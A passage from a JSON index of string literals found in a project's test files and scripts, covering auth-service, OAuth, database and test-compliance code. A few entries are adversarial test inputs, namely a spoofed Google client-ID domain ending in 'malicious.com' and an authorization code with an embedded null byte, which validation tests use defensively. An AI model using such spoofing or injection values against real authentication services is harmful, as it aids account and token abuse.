        "auth_service/tests/factories/permission_factory.py:21"
      ]
    },
    "chat:read_own": {
      "value": "chat:read_own",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:22",
        "auth_service/tests/factories/permission_factory.py:186"
      ]
    },
    "check": {
      "value": "check",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:251",
        "scripts/test_staging_migrations.py:248"
      ]
    },
    "check_and_fix_attribute": {
      "value": "check_and_fix_attribute",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:60"
      ]
    },
    "check_and_fix_import": {
      "value": "check_and_fix_import",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:49",
        "scripts/fix_test_batch.py:307"
      ]
    },
    "checked_in": {
      "value": "checked_in",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:257"
      ]
    },
    "checked_out": {
      "value": "checked_out",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:179",
        "auth_service/tests/test_database_manager.py:258",
        "auth_service/tests/test_graceful_shutdown_failures.py:148",
        "auth_service/tests/test_graceful_shutdown_failures.py:162",
        "auth_service/tests/test_graceful_shutdown_failures.py:162",
        "auth_service/tests/test_graceful_shutdown_failures.py:348",
        "auth_service/tests/test_graceful_shutdown_failures.py:352"
      ]
    },
    "chällenge_with_ünïcode": {
      "value": "chällenge_with_ünïcode",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:123"
      ]
    },
    "ci": {
      "value": "ci",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:106",
        "scripts/test_verify_workflow_status.py:113",
        "scripts/test_verify_workflow_status.py:122",
        "scripts/test_verify_workflow_status.py:140",
        "scripts/test_verify_workflow_status.py:147",
        "scripts/test_verify_workflow_status_corrected.py:119",
        "scripts/test_verify_workflow_status_corrected.py:128",
        "scripts/test_verify_workflow_status_corrected.py:141",
        "scripts/test_verify_workflow_status_corrected.py:163",
        "scripts/test_verify_workflow_status_corrected.py:171"
      ]
    },
    "circuit": {
      "value": "circuit",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:776"
      ]
    },
    "circuit_final_test_": {
      "value": "circuit_final_test_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:770"
      ]
    },
    "circuit_test_code_": {
      "value": "circuit_test_code_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:761"
      ]
    },
    "claims-user-456": {
      "value": "claims-user-456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:40"
      ]
    },
    "claims@example.com": {
      "value": "claims@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:41"
      ]
    },
    "claims@netrasystems.ai": {
      "value": "claims@netrasystems.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:129"
      ]
    },
    "class": {
      "value": "class",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:679",
        "scripts/fix_test_batch.py:115",
        "scripts/fix_test_syntax_errors.py:64",
        "scripts/fix_test_syntax_errors.py:141",
        "scripts/fix_test_syntax_errors.py:172"
      ]
    },
    "class (Test\\w+)[^:]*:": {
      "value": "class (Test\\w+)[^:]*:",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:154"
      ]
    },
    "class Test": {
      "value": "class Test",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:120",
        "scripts/autonomous_review/test_generator.py:196",
        "scripts/compliance/real_test_requirements_enforcer.py:153",
        "scripts/compliance/test_size_validator.py:170"
      ]
    },
    "class TestSyntaxFix": {
      "value": "class TestSyntaxFix",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:47"
      ]
    },
    "class TestSyntaxFix:": {
      "value": "class TestSyntaxFix:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_errors.py:94"
      ]
    },
    "class \\\\g<0>:": {
      "value": "class \\\\g<0>:",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:247"
      ]
    },
    "class \\\\w+\\\\(unittest\\\\.TestCase\\\\):": {
      "value": "class \\\\w+\\\\(unittest\\\\.TestCase\\\\):",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:247"
      ]
    },
    "class\"\"\"\n    \n    def test_initialization(self):\n        \"\"\"Test": {
      "value": "class\"\"\"\n    \n    def test_initialization(self):\n        \"\"\"Test",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:198"
      ]
    },
    "class\\s+(\\w+)\\s*[\\(:]": {
      "value": "class\\s+(\\w+)\\s*[\\(:]",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:136"
      ]
    },
    "class\\s+Mock\\w*:": {
      "value": "class\\s+Mock\\w*:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:52"
      ]
    },
    "class\\s+Mock\\w*Component": {
      "value": "class\\s+Mock\\w*Component",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:149"
      ]
    },
    "class\\s+Test\\w*Component\\w*:": {
      "value": "class\\s+Test\\w*Component\\w*:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:55"
      ]
    },
    "class\\s+\\w*Component\\w*Mock\\w*:": {
      "value": "class\\s+\\w*Component\\w*Mock\\w*:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:54"
      ]
    },
    "class\\s+\\w*Mock\\w*:": {
      "value": "class\\s+\\w*Mock\\w*:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:53"
      ]
    },
    "class_based": {
      "value": "class_based",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:462"
      ]
    },
    "class_to_function": {
      "value": "class_to_function",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:331"
      ]
    },
    "classes": {
      "value": "classes",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:58",
        "scripts/autonomous_review/test_reviewer.py:99",
        "scripts/autonomous_review/test_reviewer.py:99",
        "scripts/compliance/demo_test_size_enforcement.py:90",
        "scripts/compliance/test_refactor_helper.py:102",
        "scripts/compliance/test_refactor_helper.py:463",
        "scripts/compliance/test_refactor_helper.py:708"
      ]
    },
    "claude-3-opus": {
      "value": "claude-3-opus",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:51"
      ]
    },
    "claude-3-sonnet": {
      "value": "claude-3-sonnet",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:35"
      ]
    },
    "clean@example.com": {
      "value": "clean@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:251"
      ]
    },
    "cleanup": {
      "value": "cleanup",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:48",
        "scripts/test_websocket_dev_mode.py:44",
        "scripts/test_websocket_dev_mode.py:253"
      ]
    },
    "cleanup                   → Resource management validation": {
      "value": "cleanup                   → Resource management validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:398"
      ]
    },
    "cleanup_duration_seconds": {
      "value": "cleanup_duration_seconds",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:297",
        "auth_service/tests/test_session_cleanup.py:302"
      ]
    },
    "cleanup_expired_sessions": {
      "value": "cleanup_expired_sessions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:275"
      ]
    },
    "cleanup_inactive_sessions": {
      "value": "cleanup_inactive_sessions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:276"
      ]
    },
    "cleanup_test_processes.py": {
      "value": "cleanup_test_processes.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:524"
      ]
    },
    "cleanup_timestamp": {
      "value": "cleanup_timestamp",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:298",
        "auth_service/tests/test_session_cleanup.py:303"
      ]
    },
    "clickhouse": {
      "value": "clickhouse",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:36",
        "scripts/business_value_test_index.py:380",
        "scripts/business_value_test_index.py:440",
        "scripts/test_staging_startup.py:81",
        "scripts/test_staging_startup.py:218",
        "scripts/unified_test_config.py:168"
      ]
    },
    "clickhouse-default-password": {
      "value": "clickhouse-default-password",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:144"
      ]
    },
    "clickhouse/test_realistic_clickhouse_operations.py": {
      "value": "clickhouse/test_realistic_clickhouse_operations.py",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:208"
      ]
    },
    "clickhouse://localhost:9000/test": {
      "value": "clickhouse://localhost:9000/test",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:80"
      ]
    },
    "clickhouse_connection": {
      "value": "clickhouse_connection",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:42"
      ]
    },
    "clickhouse|ClickHouse": {
      "value": "clickhouse|ClickHouse",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:440"
      ]
    },
    "client": {
      "value": "client",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:116",
        "scripts/compliance/real_test_requirements_enforcer.py:239",
        "scripts/compliance/real_test_requirements_enforcer.py:261"
      ]
    },
    "client-id..googleusercontent.com": {
      "value": "client-id..googleusercontent.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:259"
      ]
    },
    "client-id.apps.google.com": {
      "value": "client-id.apps.google.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:253"
      ]
    },
    "client-id.example.com": {
      "value": "client-id.example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:254"
      ]
    },
    "client-id.googleusercontent.co": {
      "value": "client-id.googleusercontent.co",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:257"
      ]
    },
    "client-id.googleusercontent.com.malicious.com": {
      "value": "client-id.googleusercontent.com.malicious.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:260"
      ]
    },
    "client-id@googleusercontent.com": {
      "value": "client-id@googleusercontent.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:255"
      ]
    },
    "client.get": {
      "value": "client.get",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:56"
      ]
    },
    "client.post": {
      "value": "client.post",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:56"
      ]
    },
    "clientId": {
      "value": "clientId",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:153"
      ]
    },
    "client_id": {
      "value": "client_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:105",
        "scripts/test_config_loading.py:102"
      ]
    },
    "client_id=": {
      "value": "client_id=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:42"
      ]
    },
    "client_secret": {
      "value": "client_secret",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:103"
      ]
    },
    "cloud_sql": {
      "value": "cloud_sql",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:239"
      ]
    },
    "cloudsql": {
      "value": "cloudsql",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:232",
        "auth_service/tests/test_critical_staging_database_failures.py:183"
      ]
    },
    "cls": {
      "value": "cls",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:200"
      ]
    },
    "cmdline": {
      "value": "cmdline",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:211",
        "auth_service/tests/auth-service-down-critical-scenarios.py:213",
        "auth_service/tests/auth-service-down-critical-scenarios.py:233",
        "auth_service/tests/auth-service-down-critical-scenarios.py:235",
        "auth_service/tests/auth-service-down-critical-scenarios.py:499",
        "auth_service/tests/auth-service-down-critical-scenarios.py:501",
        "auth_service/tests/auth-service-down-critical-scenarios.py:513",
        "auth_service/tests/auth-service-down-critical-scenarios.py:515",
        "auth_service/tests/auth-service-down-critical-scenarios.py:534",
        "auth_service/tests/auth-service-down-critical-scenarios.py:536"
      ]
    },
    "code": {
      "value": "code",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:68",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:150",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:189",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:265",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:298",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:304",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:336",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:372",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:399",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:449"
      ]
    },
    "code\u0000null_byte": {
      "value": "code\u0000null_byte",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:451"
      ]
    },
    "code-with_special.chars!": {
      "value": "code-with_special.chars!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:312"
      ]
    },
    "code_challenge": {
      "value": "code_challenge",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:192"
      ]
    },
    "code_lines": {
      "value": "code_lines",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:312"
      ]
    },
    "code_verifier": {
      "value": "code_verifier",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:191"
      ]
    },
    "collection_warnings": {
      "value": "collection_warnings",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:115"
      ]
    },
    "combined_recommendations": {
      "value": "combined_recommendations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:241"
      ]
    },
    "comes AFTER first import at line": {
      "value": "comes AFTER first import at line",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:60"
      ]
    },
    "command": {
      "value": "command",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:669",
        "scripts/unified_test_runner.py:84",
        "scripts/unified_test_runner.py:90",
        "scripts/unified_test_runner.py:96"
      ]
    },
    "commit_sha": {
      "value": "commit_sha",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:192"
      ]
    },
    "complete_": {
      "value": "complete_",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:197"
      ]
    },
    "complete_workflow": {
      "value": "complete_workflow",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:47"
      ]
    },
    "complete_workflow         → End-to-end integration validation": {
      "value": "complete_workflow         → End-to-end integration validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:397"
      ]
    },
    "completed": {
      "value": "completed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:184"
      ]
    },
    "completion": {
      "value": "completion",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:40"
      ]
    },
    "completion_tokens": {
      "value": "completion_tokens",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:75",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:108",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:116"
      ]
    },
    "complex_secure_password_123!@#": {
      "value": "complex_secure_password_123!@#",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:266"
      ]
    },
    "complex_staging_password_123!": {
      "value": "complex_staging_password_123!",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:130"
      ]
    },
    "complexity": {
      "value": "complexity",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:145",
        "scripts/autonomous_review/test_generator.py:157",
        "scripts/autonomous_review/test_reviewer.py:91",
        "scripts/compliance/test_size_validator.py:313",
        "scripts/test_example_message_flow.py:286",
        "scripts/test_example_message_flow.py:408"
      ]
    },
    "complexity_based": {
      "value": "complexity_based",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:841"
      ]
    },
    "compliance": {
      "value": "compliance",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:423"
      ]
    },
    "compliance_rate": {
      "value": "compliance_rate",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:136",
        "scripts/check_test_compliance.py:161",
        "scripts/check_test_compliance.py:189",
        "scripts/check_test_compliance.py:214"
      ]
    },
    "component": {
      "value": "component",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:661",
        "scripts/business_value_test_index.py:669",
        "scripts/compliance/project_test_validator.py:172",
        "scripts/compliance/project_test_validator.py:184",
        "scripts/compliance/real_test_requirements_enforcer.py:239",
        "scripts/compliance/real_test_requirements_enforcer.py:261",
        "scripts/compliance/real_test_validator.py:125",
        "scripts/compliance/real_test_validator.py:136"
      ]
    },
    "component_coverage": {
      "value": "component_coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:624"
      ]
    },
    "components": {
      "value": "components",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:76",
        "scripts/business_value_test_index.py:541",
        "scripts/business_value_test_index.py:598",
        "scripts/test_frontend.py:31"
      ]
    },
    "components_covered": {
      "value": "components_covered",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:598"
      ]
    },
    "compose": {
      "value": "compose",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:375"
      ]
    },
    "comprehensive": {
      "value": "comprehensive",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:39",
        "scripts/test_frontend_simple.py:76",
        "scripts/unified_test_config.py:46",
        "scripts/unified_test_config.py:120",
        "scripts/unified_test_config.py:227",
        "scripts/unified_test_config.py:232",
        "scripts/unified_test_config.py:237"
      ]
    },
    "comprehensive_fix_": {
      "value": "comprehensive_fix_",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:404"
      ]
    },
    "concurrent": {
      "value": "concurrent",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:348"
      ]
    },
    "concurrent@example.com": {
      "value": "concurrent@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1302"
      ]
    },
    "concurrent_code_": {
      "value": "concurrent_code_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:301"
      ]
    },
    "concurrent_writes": {
      "value": "concurrent_writes",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:38"
      ]
    },
    "config": {
      "value": "config",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:162",
        "scripts/unified_test_runner.py:83",
        "scripts/unified_test_runner.py:89",
        "scripts/unified_test_runner.py:95"
      ]
    },
    "config/alembic.ini": {
      "value": "config/alembic.ini",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:106"
      ]
    },
    "config/pytest.ini": {
      "value": "config/pytest.ini",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:14"
      ]
    },
    "config_check": {
      "value": "config_check",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:47",
        "scripts/test_oauth_local.py:90",
        "scripts/test_oauth_local.py:396",
        "scripts/test_oauth_local.py:396",
        "scripts/test_oauth_local.py:397"
      ]
    },
    "config_endpoint": {
      "value": "config_endpoint",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:38",
        "scripts/test_websocket_dev_mode.py:99"
      ]
    },
    "config_file": {
      "value": "config_file",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:164",
        "scripts/unified_test_config.py:173",
        "scripts/unified_test_config.py:182",
        "scripts/unified_test_config.py:400"
      ]
    },
    "config_fixes": {
      "value": "config_fixes",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:406"
      ]
    },
    "configuration": {
      "value": "configuration",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:187"
      ]
    },
    "configuration error": {
      "value": "configuration error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:198"
      ]
    },
    "configuration_loading": {
      "value": "configuration_loading",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:38"
      ]
    },
    "conftest.py": {
      "value": "conftest.py",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:35",
        "scripts/check_conftest_violations.py:36",
        "scripts/compliance/project_test_validator.py:112",
        "scripts/compliance/real_test_validator.py:69",
        "scripts/generate_test_audit.py:79"
      ]
    },
    "conftest.py files** for pytest configuration\n- **": {
      "value": "conftest.py files** for pytest configuration\n- **",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:159"
      ]
    },
    "conftest_files": {
      "value": "conftest_files",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:64",
        "scripts/generate_test_audit.py:81",
        "scripts/generate_test_audit.py:146",
        "scripts/generate_test_audit.py:281"
      ]
    },
    "connect() got an unexpected keyword argument 'sslmode'": {
      "value": "connect() got an unexpected keyword argument 'sslmode'",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:240"
      ]
    },
    "connected": {
      "value": "connected",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:14",
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:22"
      ]
    },
    "connecting": {
      "value": "connecting",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:15"
      ]
    },
    "connection": {
      "value": "connection",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:797",
        "auth_service/tests/test_database_authentication_failures.py:134",
        "auth_service/tests/test_database_authentication_failures.py:226",
        "scripts/auto_fix_test_sizes.py:342"
      ]
    },
    "connection failed: FATAL: database \"": {
      "value": "connection failed: FATAL: database \"",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:120"
      ]
    },
    "connection refused": {
      "value": "connection refused",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:94",
        "auth_service/tests/test_database_authentication_failures.py:372"
      ]
    },
    "connection to server at \"/cloudsql/netra-staging:us-central1:netra-staging-db\" failed: FATAL: database \"netra_staging\" does not exist": {
      "value": "connection to server at \"/cloudsql/netra-staging:us-central1:netra-staging-db\" failed: FATAL: database \"netra_staging\" does not exist",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:168"
      ]
    },
    "connection to server at \"test-db-host\" (IP_ADDRESS), port 5432 failed: FATAL: database \"netra_staging\" does not exist": {
      "value": "connection to server at \"test-db-host\" (IP_ADDRESS), port 5432 failed: FATAL: database \"netra_staging\" does not exist",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:66"
      ]
    },
    "connection to server failed: SSL connection has been closed unexpectedly": {
      "value": "connection to server failed: SSL connection has been closed unexpectedly",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:261"
      ]
    },
    "connections not cleaned up": {
      "value": "connections not cleaned up",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:357"
      ]
    },
    "connections not properly cleaned up": {
      "value": "connections not properly cleaned up",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:353"
      ]
    },
    "conservative": {
      "value": "conservative",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:374"
      ]
    },
    "consistency-service": {
      "value": "consistency-service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:208"
      ]
    },
    "consistency-test-service": {
      "value": "consistency-test-service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:209"
      ]
    },
    "consistency-test-user": {
      "value": "consistency-test-user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:206"
      ]
    },
    "consistency@example.com": {
      "value": "consistency@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:207"
      ]
    },
    "consistent latency": {
      "value": "consistent latency",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:104"
      ]
    },
    "consistently failing tests": {
      "value": "consistently failing tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:329"
      ]
    },
    "consistently_failing": {
      "value": "consistently_failing",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:296",
        "scripts/compliance/fake_test_scanner.py:327",
        "scripts/compliance/fake_test_scanner.py:329"
      ]
    },
    "const\\s+Mock\\w*\\s*=": {
      "value": "const\\s+Mock\\w*\\s*=",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:61"
      ]
    },
    "const\\s+Mock\\w+\\s*=.*?return\\s*<": {
      "value": "const\\s+Mock\\w+\\s*=.*?return\\s*<",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:75"
      ]
    },
    "const\\s+\\w+Form\\s*=.*?return\\s*<div": {
      "value": "const\\s+\\w+Form\\s*=.*?return\\s*<div",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:76"
      ]
    },
    "const\\s+mock\\w*\\s*=": {
      "value": "const\\s+mock\\w*\\s*=",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:62"
      ]
    },
    "content": {
      "value": "content",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:531",
        "scripts/test_cold_start_e2e.py:348",
        "scripts/test_cold_start_e2e.py:416",
        "scripts/test_example_message_flow.py:281",
        "scripts/test_example_message_flow.py:403"
      ]
    },
    "content-length": {
      "value": "content-length",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:37"
      ]
    },
    "content-type": {
      "value": "content-type",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:133",
        "auth_service/tests/test_security.py:38",
        "auth_service/tests/test_security.py:338"
      ]
    },
    "content_generation": {
      "value": "content_generation",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:30"
      ]
    },
    "content_preview": {
      "value": "content_preview",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:603"
      ]
    },
    "content_similarity": {
      "value": "content_similarity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:373",
        "scripts/analyze_test_overlap.py:630"
      ]
    },
    "context.py": {
      "value": "context.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:114"
      ]
    },
    "conversion": {
      "value": "conversion",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:287",
        "scripts/test_example_message_flow.py:409"
      ]
    },
    "convert_database_url": {
      "value": "convert_database_url",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:41"
      ]
    },
    "core": {
      "value": "core",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:359",
        "scripts/auto_fix_test_sizes.py:372",
        "scripts/auto_fix_test_violations.py:403",
        "scripts/auto_fix_test_violations.py:504",
        "scripts/standardize_l3_test_names.py:206"
      ]
    },
    "correct_session_67890": {
      "value": "correct_session_67890",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:337"
      ]
    },
    "correct_session_789": {
      "value": "correct_session_789",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:155"
      ]
    },
    "correctpassword123!": {
      "value": "correctpassword123!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:81"
      ]
    },
    "cors": {
      "value": "cors",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1085"
      ]
    },
    "cors_validation": {
      "value": "cors_validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:40",
        "scripts/test_websocket_dev_mode.py:162"
      ]
    },
    "cost": {
      "value": "cost",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:54"
      ]
    },
    "cost-optimization": {
      "value": "cost-optimization",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:285",
        "scripts/test_example_message_flow.py:407"
      ]
    },
    "cost_data": {
      "value": "cost_data",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72"
      ]
    },
    "cost_optimization": {
      "value": "cost_optimization",
      "category": "test_literals",
      "locations": [
